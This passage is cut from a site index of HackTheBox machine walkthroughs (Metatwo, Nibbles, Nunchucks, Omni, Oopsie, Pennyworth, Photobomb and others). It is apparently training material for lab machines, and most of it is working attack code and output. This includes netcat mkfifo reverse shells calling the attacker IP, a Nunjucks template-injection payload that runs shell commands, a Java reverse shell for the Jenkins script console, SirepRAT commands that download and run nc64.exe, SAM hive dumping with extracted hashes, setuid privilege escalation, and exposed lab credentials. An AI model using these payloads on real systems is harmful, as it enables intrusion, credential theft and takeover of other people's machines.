ftp server command line:</p> <pre><code>mget send_email.php\n</code></pre> <p>From our attacking machine we can see the content of that file:</p> <pre><code>cat send_email.php\n</code></pre> <p>Results:</p> <pre><code>&lt;?php\n/*\n * This script will be used to send an email to all our users when ready for launch\n*/\n\nuse PHPMailer\\PHPMailer\\PHPMailer;\nuse PHPMailer\\PHPMailer\\SMTP;\nuse PHPMailer\\PHPMailer\\Exception;\n\nrequire 'PHPMailer/src/Exception.php';\nrequire 'PHPMailer/src/PHPMailer.php';\nrequire 'PHPMailer/src/SMTP.php';\n\n$mail = new PHPMailer(true);\n\n$mail-&gt;SMTPDebug = 3;                               \n$mail-&gt;isSMTP();            \n\n$mail-&gt;Host = \"mail.metapress.htb\";\n$mail-&gt;SMTPAuth = true;                          \n$mail-&gt;Username = \"jnelson@metapress.htb\";                 \n$mail-&gt;Password = \"Cb4_JmWM8zUZWMu@Ys\";                           \n$mail-&gt;SMTPSecure = \"tls\";                           \n$mail-&gt;Port = 587;                                   \n\n$mail-&gt;From = \"jnelson@metapress.htb\";\n$mail-&gt;FromName = \"James Nelson\";\n\n$mail-&gt;addAddress(\"info@metapress.htb\");\n\n$mail-&gt;isHTML(true);\n\n$mail-&gt;Subject = \"Startup\";\n$mail-&gt;Body = \"&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;\";\n\ntry {\n    $mail-&gt;send();\n    echo \"Message has been sent successfully\";\n} catch (Exception $e) {\n    echo \"Mailer Error: \" . $mail-&gt;ErrorInfo;\n}\n</code></pre> <p>This script contains credentials of the user jnelson, that we had spotted before in the /etc/passwd file, but now we also have his password.</p> <p>From the initial enumeration of ports and services in the Metatwo machine, we know that ssh service is running. We try to login in to that service:</p> <pre><code># Quick install sshpass if you prefer to enter the ssh connection in one line.\n\nsudo apt install sshpass\nsshpass -p 'Cb4_JmWM8zUZWMu@Ys' ssh jnelson@10.10.11.186\n</code></pre> <p>Now, you are in jnelson terminal. To get the user's flag, run:</p> <pre><code>cat user.txt\n</code></pre>","tags":["walkthrough"]},{"location":"htb-metatwo/#getting-the-systems-flag","title":"Getting the System's flag","text":"<p>Coming soon.</p>","tags":["walkthrough"]},{"location":"htb-metatwo/#some-other-write-ups-and-learning-material-related","title":"Some other write-ups and learning material related","text":"<ul> <li>https://tryhackme.com/room/wordpresscve202129447</li> <li>Wpscan: CVE-2021-29447</li> <li>https://www.maketecheasier.com/pgp-encryption-how-it-works/</li> </ul>","tags":["walkthrough"]},{"location":"htb-mongod/","title":"Walkthrough - A HackTheBox machine - Mongod","text":"<p>Enumerate open services/ports:</p> <pre><code>nmap -sC -sV $ip -Pn -p-\n</code></pre> <p>Ports 22 and 27017 are open. </p> <pre><code>mongo IP:port\n# in my case: mongo 10.129.228.30:27017 \n</code></pre> <p>Now, use mongodb cheat sheet to browse the databases:</p> <pre><code>show databases\nuse sensitive_information\nshow collections\ndb.flag.find()\n</code></pre>","tags":["walkthrough","mongodb","port 27017"]},{"location":"htb-nibbles/","title":"Nibbles - A HackTheBox machine","text":"<p>voy# Nibbles - A Hack The Box machine</p> <pre><code>nmap -sC -sV -Pn 10.129.96.84 \n</code></pre> <p>Results:</p> <pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)\n|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)\n|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <p>Visiting the IP:80 in the browser and reviewing source code there is a comment:</p> <pre><code>&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;\n</code></pre> <p>So, we have a website at http://10.129.96.84/nibbleblog/</p> <p>Dirb enumeration reveals a login panel: http://10.129.96.84/nibbleblog/admin.php</p> <pre><code>dirb http://10.129.96.84/nibbleblog/ /usr/share/wordlists/dirb/common.txt\n</code></pre> <p>Too many login attempts too quickly trigger a lockout with the message \"Nibbleblog security error - Blacklist protection\".</p> <p>Also, dirb enumeration reveals some directories that are listable. Browsing around we get to this file: http://10.129.96.84/nibbleblog/content/private/users.xml where user \"admin\" is exposed.</p> <p>Also CMS version is disclosed in http://10.129.96.84/nibbleblog/README:</p> <pre><code>====== Nibbleblog ======\nVersion: v4.0.3\nCodename: Coffee\nRelease date: 2014-04-01\n</code></pre> <p>A quick search for that version brings up this vulnerability:</p> <p>https://github.com/dix0nym/CVE-2015-6967/blob/main/README.md</p> <p>In the usage example we can read:</p> <pre><code>python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php\n</code></pre> <p>Default credentials are: </p> <pre><code>admin:nibbles\n</code></pre> <p>Also, reading the code of the exploit, we can see that the triggered endpoint for this CVE-2015-6967 is:</p> <pre><code>uploadURL = f\"{nibbleURL}admin.php?controller=plugins&amp;action=config&amp;plugin=my_image\"\n</code></pre> <p>Knowing this, we can login into the panel http://10.129.96.84/nibbleblog/admin.php and go to Plugins&gt;My Image&gt; Configure.</p> <p>In the browser, upload a file. In my case, I uploaded my pentesmonkey.</p> <p>Now, we need to find where this file has been saved to. After browsing around, I ended up in http://10.129.96.84/nibbleblog/content/private/plugins/my_image/</p> <p>There there was a file called image.php. Before clicking on it, we open in our attacker machine a netcat listener:</p> <pre><code>nc -lnvp 1234\n</code></pre> <p>Click on the file image.php listed in http://10.129.96.84/nibbleblog/content/private/plugins/my_image/ and you will have a reverse shell.</p> <p>Cat user.txt (under /home/nibbler).</p>","tags":["walkthrough","reverse shell","CVE-2015-6967"]},{"location":"htb-nibbles/#privilege-escalation","title":"Privilege escalation","text":"<pre><code>sudo -l\n</code></pre> <p>Results:</p> <pre><code>$ sudo -l\nMatching Defaults entries for nibbler on Nibbles:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n</code></pre> <p>At /home/nibbler, unzip the file personal.zip. Now you can even replace monitor.sh for a different monitor.sh. Mine has:</p> <pre><code>/bin/bash\n</code></pre> <p>Now run:</p> <pre><code>sudo -u root .home/nibbler/personal/stuff/monitor.sh\n</code></pre> <p>And you are root. Remember to do a chmod if needed.</p>","tags":["walkthrough","reverse shell","CVE-2015-6967"]},{"location":"htb-nibbles/#some-input-from-htb-walkthrough","title":"Some input from HTB walkthrough","text":"<p>You can run nmap script for nibbles service:</p> <pre><code>nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190\n</code></pre> <p>For privilege escalation:</p> <pre><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 8443 &gt;/tmp/f' | tee -a monitor.sh\n</code></pre> <p>Alternative way: </p> <pre><code>msf6 &gt; search nibbleblog\n\nmsf6 &gt; use exploit/multi/http/nibbleblog_file_upload\n\nmsf6 exploit(multi/http/nibbleblog_file_upload) &gt; set rhosts 10.129.42.190\nrhosts =&gt; 10.129.42.190\nmsf6 exploit(multi/http/nibbleblog_file_upload) &gt; set lhost 10.10.14.2 \nlhost =&gt; 10.10.14.2\n</code></pre> <p>We need to set the admin username and password admin:nibbles and the TARGETURI to nibbleblog.</p>","tags":["walkthrough","reverse shell","CVE-2015-6967"]},{"location":"htb-nunchucks/","title":"Nunchucks - A Hack The Box machine","text":"","tags":["walkthrough"]},{"location":"htb-nunchucks/#users-flag","title":"User's flag","text":"","tags":["walkthrough"]},{"location":"htb-nunchucks/#enumeration","title":"Enumeration","text":"<pre><code>nmap -sC -sV 10.129.95.252 -Pn\n</code></pre> <p>Open ports: 22, 80, and 443.</p> <p>Also http://nunchucks.htb is in results.</p> <p>Adding IP and domain nunchucks.htb to /etc/hosts.</p> <pre><code>whatweb http://nunchucks.htb \n</code></pre> <p>And some directory enumeration:</p> <pre><code>feroxbuster -u https://nunchucks.htb -k\n</code></pre> <p>Results:</p> <pre><code>200      GET      250l     1863w    19134c https://nunchucks.htb/Privacy\n200      GET      245l     1737w    17753c https://nunchucks.htb/Terms\n200      GET      183l      662w     9172c https://nunchucks.htb/login\n200      GET      187l      683w     9488c https://nunchucks.htb/signup\n</code></pre> <p>Trying to login into the application or signing up returns the following response message:</p> <pre><code>{\"response\":\"We're sorry but user logins are currently disabled.\"}\n\n{\"response\":\"We're sorry but registration is currently closed.\"}\n</code></pre> <p>Now, we will try some subdomain enumeration</p> <pre><code>wfuzz -c --hc 404 -t 200 -u https://nunchucks.htb/ -w /usr/share/dirb/wordlists/common.txt -H \"Host: FUZZ.nunchucks.htb\" --hl 546\n# -c: Color in output\n# \u2013hc 404: Hide 404 code responses\n# -t 200: Concurrent Threads\n# -u http://nunchucks.htb/: Target URL\n# -w /usr/share/dirb/wordlists/common.txt: Wordlist \n# -H \u201cHost: FUZZ.nunchucks.htb\u201d: Header. Also with \"FUZZ\" we indicate the injection point for payloads\n# \u2013hl 546: Filter out responses with a specific number of lines. In this case, 546\n</code></pre> <p>Results: store</p> <p>We will add store.nunchucks.htb to /etc/hosts file.</p>","tags":["walkthrough"]},{"location":"htb-nunchucks/#exploitation","title":"Exploitation","text":"<p>Browsing https://store.nunchucks.htb is a simple landing page to collect emails. There is a form for this purpose. After fuzzing it with Burpsuite we find this interesting output:</p> <p></p> <p>Some code can get executed in that field. This vulnerability is known as Server-side Template Injection (SSTI)</p> <p>Once we have an injection endpoint, it's important to identify the application server and template engine running on it, since payloads and exploitation pretty much depends on it.</p> <p>From headers response we have: \"X-Powered-By: Express\". </p> <p>Having a look at template engines in Express at https://expressjs.com/en/resources/template-engines.html, there exists a Nunjucks, which is close the domain name nunchucks. </p> <p>This blog post describe how we can exploit this vulnerability: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine</p> <p>Basically, I'm using the following payloads:</p> <pre><code>{{range}}\n\n{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('id')\\\")()}}\n\n{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\\\")()}}\n\n{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 1234 &gt;/tmp/f')\\\")()}}\n</code></pre> <p>The last one is a reverse shell. Before running it in BurpSuite Repeater, I've setup my listener with netcat on port 1234.</p>","tags":["walkthrough"]},{"location":"htb-nunchucks/#roots-flag","title":"Root's flag","text":"","tags":["walkthrough"]},{"location":"htb-nunchucks/#privileges-escalation","title":"Privileges escalation","text":"<p>We'll abuse some process capability vulnerability to escalate to root. First we list processes capabilities:</p> <pre><code>getcap -r 2&gt;/dev/null\n</code></pre> <p>Result:</p> <pre><code>/usr/bin/perl = cap_setuid+ep\n/usr/bin/mtr-packet = cap_net_raw+ep\n/usr/bin/ping = cap_net_raw+ep\n/usr/bin/traceroute6.iputils = cap_net_raw+ep\n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep\n</code></pre> <p>We will use perl binary to escalate. </p> <pre><code>echo -ne '#!/bin/perl \\nuse POSIX qw(setuid); \\nPOSIX::setuid(0); \\nexec \"/bin/bash\";' &gt; pay.pl\nchmod +x pay.pl\n./pay.pl\n</code></pre> <p>And you are root.</p>","tags":["walkthrough"]},{"location":"htb-omni/","title":"Walkthrough - Omni, a Hack The Box machine","text":"","tags":["walkthrough"]},{"location":"htb-omni/#about-the-machine","title":"About the machine","text":"data Machine Omni Platform Hackthebox url link OS Windows Difficulty Easy Points 20 ip 10.129.2.27","tags":["walkthrough"]},{"location":"htb-omni/#getting-usertxt-flag","title":"Getting user.txt flag","text":"","tags":["walkthrough"]},{"location":"htb-omni/#enumeration","title":"Enumeration","text":"<pre><code>sudo nmap -sV -sC $ip -p-\n</code></pre> <p>Results:</p> <pre><code>PORT      STATE SERVICE  VERSION\n135/tcp   open  msrpc    Microsoft Windows RPC\n5985/tcp  open  upnp     Microsoft IIS httpd\n8080/tcp  open  upnp     Microsoft IIS httpd\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Basic realm=Windows Device Portal\n|_http-title: Site doesn't have a title.\n|_http-server-header: Microsoft-HTTPAPI/2.0\n29817/tcp open  unknown\n29819/tcp open  arcserve ARCserve Discovery\n29820/tcp open  unknown\n</code></pre>","tags":["walkthrough"]},{"location":"htb-omni/#exploiting-tcp-2981729820","title":"Exploiting  TCP 29817/29820","text":"<p>SirepRAT. Investigate </p> <pre><code># testing for an existing file\npython ~/tools/SirepRAT/SirepRAT.py $ip GetFileFromDevice --remote_path \"C:\\Windows\\System32\\drivers/etc/hosts\" --v\n\n# Place a nc64.exe file in the apache root server\nsudo cp ~/tools/nc64.exe /var/www/html\n\n# Start Apache server\nsudo service apache2 start\n\n# Upload nc64.exe: With SireRAT use cmd.exe in the victim's machine to lauch a powershell \npython ~/tools/SirepRAT/SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args ' /c powershell Invoke-WebRequest -outfile c:\\windows\\system32\\nc64.exe -uri http://10.10.14.2/nc64.exe'\n\npython ~/tools/SirepRAT/SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args ' /c powershell Invoke-WebRequest -outfile c:\\windows\\system32\\nc64.exe -uri http://10.10.14.2/nc64.exe'\n\n\n# Open a listener in our attacker machine\nrlwrap nc -lnvp 443\n\n# Launch netcat in victim's machine via SirepRAT\npython ~/tools/SirepRAT/SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args ' /c c:\\windows\\system32\\nc64.exe -e cmd 10.10.14.2 443'\n</code></pre> <p>After browsing around we can see these interesting files:</p> <ul> <li>C:\\Data\\Users\\administrator\\root.txt</li> <li>C:\\Data\\Users\\app\\user.txt</li> <li>C:\\Data\\Users\\app\\iot-admin.xml</li> <li> <ul> <li>C:\\Data\\Users\\app\\hardening.txt</li> </ul> </li> </ul> <p>user.txt and root.txt \u00a0are PSCredential files with this format. To decrypt their passwords, we will need  the user\u2019s password and the administrator's password. There are several approaches to obtain them:</p>","tags":["walkthrough"]},{"location":"htb-omni/#path-1-creds-in-a-file","title":"Path 1: creds in a file","text":"<p>Evaluate all files until you get to C:\\Program Files\\WindowsPowershell\\Modules\\PackageManagement. Use powershell so you can run:</p> <pre><code>ls -force\ntype r.bat\n</code></pre> <p>Result:</p> <pre><code>@echo off\n\n:LOOP\n\nfor /F \"skip=6\" %%i in ('net localgroup \"administrators\"') do net localgroup \"administrators\" %%i /delete\n\nnet user app mesh5143\nnet user administrator _1nt3rn37ofTh1nGz\n\nping -n 3 127.0.0.1\n\ncls\n\nGOTO :LOOP\n\n:EXIT\n</code></pre>","tags":["walkthrough"]},{"location":"htb-omni/#path-2-dump-samsystemsecurity-hives-extract-hashes-and-crack-them","title":"Path 2: Dump sam/system/security hives, extract hashes and crack them","text":"<p>We will dump the SAM database to the attacker's machine. For that, first we will create a share in the attacker's machine:</p> <pre><code># First crate the share CompData in our attacker's machine\nsudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/ -username \"username\" -password \"agreatpassword\"\n</code></pre> <pre><code>#  After that, establish the connection with nc\npython ~/tools/SirepRAT/SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args ' /c net use \\\\10.10.14.2\\CompData /u:username agreatpassword'\n</code></pre> <p>After that we can dump the hives: sam, system, and security:</p> <pre><code># Now we will dump the hives we need. First, the SAM database\npython ~/tools/SirepRAT/SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args ' /c reg save HKLM\\sam \\\\10.10.14.2\\CompData\\sam'\n\n# Secondly, system\npython ~/tools/SirepRAT/SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args ' /c reg save HKLM\\system \\\\10.10.14.2\\CompData\\system'\n\n# Thirdly, security\npython ~/tools/SirepRAT/SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args ' /c reg save HKLM\\security \\\\10.10.14.2\\CompData\\security'\n</code></pre> <p>From the attacker's machine now, we can use secretdump.py to extract the hashes:</p> <pre><code>secretsdump.py -sam sam -security security -system system LOCAL\n</code></pre> <p>From that we will obtain the following NTLM hashes:</p> <pre><code>Impacket v0.10.1.dev1+20230511.163246.f3d0b9e - Copyright 2022 Fortra\n\n[*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::\nsshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::\nDevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::\napp:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::\n</code></pre> <p>We can crack them with hashcat:</p> <pre><code>hashcat -m 1000 -O -a3 -i hashes.txt\n</code></pre>","tags":["walkthrough"]},{"location":"htb-omni/#exploiting-tcp-8080","title":"Exploiting TCP 8080","text":"<p>Credentials obtained for user \"app\" and \"administrator\" are valid to login into the portal that we observed previously in port 8080.</p> <p>Login as app, and go to the option \"Run  Command\"</p> <p></p> <p>From the attacker's machine, get a terminal listening:</p> <pre><code>rlwrap nc -lnvp 443\n</code></pre> <p>In the Run command screen, run:</p> <pre><code>c:\\windows\\system32\\nc64.exe -e cmd 10.10.14.2 443\n</code></pre> <p>The listener will display the connection. Now:</p> <pre><code># Launch powershell\npowershell\n\n# Go to \ncd C:\\Data\\Users\\app\n\n# Decrypt the PSCredential file\n(Import-CliXml -Path user.txt).GetNetworkCredential().Password\n</code></pre> <p>As a result your will obtain the user.txt's flag.</p>","tags":["walkthrough"]},{"location":"htb-omni/#get-roottxt","title":"Get root.txt","text":"<p>Logout from the portal as user \"app\" and login again as administrator.</p> <p>From the attacker's machine, get a terminal listening:</p> <pre><code>rlwrap nc -lnvp 443\n</code></pre> <p>In the Run command screen, run:</p> <pre><code>c:\\windows\\system32\\nc64.exe -e cmd 10.10.14.2 443\n</code></pre> <p>The listener will display the connection. Now:</p> <pre><code># Launch powershell\npowershell\n\n# Go to \ncd C:\\Data\\Users\\administrator\n\n# Decrypt the PSCredential file\n(Import-CliXml -Path root.txt).GetNetworkCredential().Password\n</code></pre> <p>As a result your will obtain the root.txt's flag.</p>","tags":["walkthrough"]},{"location":"htb-oopsie/","title":"Oopsie - A Hack The Box machine","text":"<pre><code>nmap -sC -sV $ip -Pn\n</code></pre> <pre><code>Host is up (0.034s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)\n|   256 241da417d4e32a9c905c30588f60778d (ECDSA)\n|_  256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Welcome\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <p>Open browser. From scripts called in home page you extract this path:</p> <pre><code>&lt;script src=\"/cdn-cgi/login/script.js\"&gt;&lt;/script&gt;\n</code></pre> <p>Then you are in a login page that provides a way to login as a guest. </p> <p>When logged in, and being a guest pay attention to cookies:</p> <p></p> <p>Now, in browser change id 2 to id 1 to see if data from other user is exposed.</p> <p></p> <p>It is. Change the value of the cookies in the browser to be admin.</p> <p></p> <p>Upload a php reverse shell. I usually use the pentesmonkey one.</p> <p>Now I use gobuster to enum possible locations for the upload:</p> <pre><code>gobuster dir -u http://10.129.95.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -t 20\n</code></pre> <pre><code>===============================================================\nGobuster v3.5\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.129.95.191\n[+] Method:                  GET\n[+] Threads:                 20\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.5\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 315] [--&gt; http://10.129.95.191/images/]\n/themes               (Status: 301) [Size: 315] [--&gt; http://10.129.95.191/themes/]\n/uploads              (Status: 301) [Size: 316] [--&gt; http://10.129.95.191/uploads/]\n/css                  (Status: 301) [Size: 312] [--&gt; http://10.129.95.191/css/]\n/js                   (Status: 301) [Size: 311] [--&gt; http://10.129.95.191/js/]\n/fonts                (Status: 301) [Size: 314] [--&gt; http://10.129.95.191/fonts/]\nProgress: 87567 / 87665 (99.89%)\n===============================================================\n==============================================================\n</code></pre> <p>Nice, but being user admin I can not get into http://10.129.95.191/uploads/.</p> <p>Is there any other user with more permissions? I will use BurpSuite Intruder to enumerate possible users based on object serialization (id). This  would be the endpoint: http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&amp;id=30</p> <p>User id 30 is super admin. With this I update my cookies and now I'm able to access http://10.129.95.191/uploads/pentesmonkey.php. Before that:</p> <pre><code>nc -lnvp 1234\n</code></pre>","tags":["walkthrough"]},{"location":"htb-pennyworth/","title":"Pennyworth - A HackTheBox machine","text":"<pre><code>nmap -sC -sV $ip -Pn -p-\n</code></pre> <p>Port 8080 is open and from browser we can see a login page of a jenkin service. Version is not displayed. </p> <p>Running this request through Burpsuite intruder</p> <pre><code>POST /j_spring_security_check HTTP/1.1\nHost: 10.129.228.92:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 62\nOrigin: http://10.129.228.92:8080\nConnection: close\nReferer: http://10.129.228.92:8080/login?from=%2F\nCookie: JSESSIONID.4f24ed31=node0de80ew54idnc17ajfpe13p5hc0.node0\nUpgrade-Insecure-Requests: 1\n\nj_username=admin&amp;j_password=!@#$%^&amp;from=%2F&amp;Submit=Sign+in\n</code></pre> <p>Payload will be in password parameter. You can use several dictionaries. In the sampled request the response will be a 500 response code with Jenkin version visible at the footer: </p> <pre><code>&lt;div class=\"page-footer__links page-footer__links--white jenkins_ver\"&gt;&lt;a rel=\"noopener noreferrer\" href=\"https://jenkins.io/\" target=\"_blank\"&gt;Jenkins 2.289.1&lt;/a&gt;&lt;/div&gt;\n</code></pre> <p>Default password for the service (admin:password) doesn't work. By performing some brute force attack with basic dictionaries, password is root:password</p> <p>Nice repository for pentesting jenkins. I guess there might be several approaches and solutions to this machine. In my case, I used the Script console provided in jenkins with the following payload:</p> <pre><code>String host=\"myip\";\nint port=1234;\nString cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre> <p>After that:</p> <pre><code>whoami\ncat /root/flag.txt\n</code></pre>","tags":["walkthrough"]},{"location":"htb-photobomb/","title":"Walkthrough - Photobomb, a Hack The Box machine","text":"","tags":["walkthrough"]},{"location":"htb-photobomb/#about-the-machine","title":"About the machine","text":"data Machine Photobomb Platform Hackthebox url link creator slartibartfast OS Linux Release data 08 October 2022 Difficulty Easy Points 20 ip 10.10.11.182","tags":["walkthrough"]},{"location":"htb-photobomb/#recon","title":"Recon","text":"<p>For the sake of commodity, we'll create a variable:</p> <pre><code>export ip=10.10.11.182\n</code></pre>","tags":["walkthrough"]},{"location":"htb-photobomb/#service-port-enumeration","title":"Service/ Port enumeration","text":"<p>Run nmap to enumerate open ports, services, OS, and traceroute</p> <p>General enumeration not to make too much noise: <pre><code>sudo nmap $ip -Pn\n</code></pre> Results: <pre><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-20 12:34 EDT\nNmap scan report for 10.10.11.182\nHost is up (0.095s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n</code></pre> Once you know open ports, run nmap to see service versions and more details:  <pre><code>sudo nmap -sCV -p22,80 $ip\n</code></pre> Results: <pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)\n|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)\n|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://photobomb.htb/\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> We open 10.10.11.182 in the browser. A redirection to http://photobomp.htb occurs, but the server is not found. So we add this routing in our /etc/hosts file:</p> <p>We open the /etc/hosts file with an editor. For instance, nano. <pre><code>sudo nano /etc/hosts\n</code></pre> We move the cursor to the end and we add these lines: <pre><code>10.10.11.182    photobomb.htb\n</code></pre></p>","tags":["walkthrough"]},{"location":"htb-photobomb/#directory-enumeration","title":"Directory enumeration","text":"<p>We can use dirbuster to enumerate directories: <pre><code>dirbuster\n</code></pre> And we configure it to launch this dictionary: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</p> <p>Results: <pre><code>Dirs found with a 200 response:\n\n/\n\nDirs found with a 401 response:\n\n/printer/\n/printers/\n/printerfriendly/\n/printer_friendly/\n/printer_icon/\n/printer-icon/\n/printer-friendly/\n/printerFriendly/\n/printersupplies/\n/printer1/\n\n\n--------------------------------\nFiles found during testing:\n\nFiles found with a 401 response:\n\n/printer\n/printer.php\n/printers.php\n/printerfriendly.php\n/printer_friendly.php\n/printer_icon.php\n/printer-friendly.php\n/printerFriendly.php\n/printersupplies.php\n/printer1.php\n\nFiles found with a 200 response:\n\n/photobomb.js\n</code></pre></p> <p>As we wait, we do a dns enumeration:</p>","tags":["walkthrough"]},{"location":"htb-photobomb/#dns-enumeration","title":"DNS enumeration","text":"<p>Running: <pre><code>nslookup\n</code></pre> And after that: <pre><code>&gt; SERVER 10.10.11.182\n</code></pre> Results: <pre><code>Default server: 10.10.11.182\nAddress: 10.10.11.182#53\n</code></pre> Then, we run: <pre><code>&gt; 10.10.11.182\n</code></pre> And as a result, we have: <pre><code>** server can't find 182.11.10.10.in-addr.arpa: NXDOMAIN\n</code></pre> So there is no result.</p>","tags":["walkthrough"]},{"location":"htb-photobomb/#exploiting-the-login-page","title":"Exploiting the login page","text":"<p>At http://photobomb.htb/printer we find a login page. Use Burp to capture the request of a failed login using \"username\" as username and \"password\" as a password. <pre><code>GET /printer HTTP/1.1\nHost: photobomb.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: http://photobomb.htb/\nUpgrade-Insecure-Requests: 1\nAuthorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=\n</code></pre> The authorization is the text \"username:password\" encoded in base64, which is known as Basic HTTP Authentication Scheme.</p> <p>After trying to brute force the login page with different seclist dictionaries, we decided to have a look at the only file with response 200 in the directory enumeration: http://photobomb.htb/photobomb.js, and bingo! The user and password are there: <pre><code>function init() {\n  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me\n  if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) {\n    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');\n  